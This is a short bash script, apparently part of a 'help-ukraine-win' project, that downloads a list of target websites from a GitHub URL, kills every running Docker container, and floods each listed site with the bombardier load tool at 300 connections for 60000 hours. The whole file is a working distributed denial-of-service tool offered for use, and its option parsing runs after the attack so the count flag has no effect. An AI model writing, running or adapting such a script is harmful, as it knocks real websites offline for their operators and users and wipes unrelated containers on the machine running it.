#!/bin/bash

function print_help {
  echo -e "Usage: bash ddos.sh"
  echo -e "--number|-n - number of containers to start"
}

TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
amount=300

docker kill $(docker ps -q)
curl --silent $TARGETS_URL --output targets.txt

echo -e "Number of containers: $amount"

while read -r site_url; do
    if [ ! -z $site_url ]; then
        echo -e "Site: $site_url"
        if [ -n "$1" ]; then
            docker run --platform linux/amd64 -d  alpine/bombardier -c $amount -d 60000h -l $site_url
        else
            docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $site_url
        fi
    fi
done < targets.txt

while test -n "$1"; do
  case "$1" in
  --number|-n)
      amount=$2
      shift
      ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done
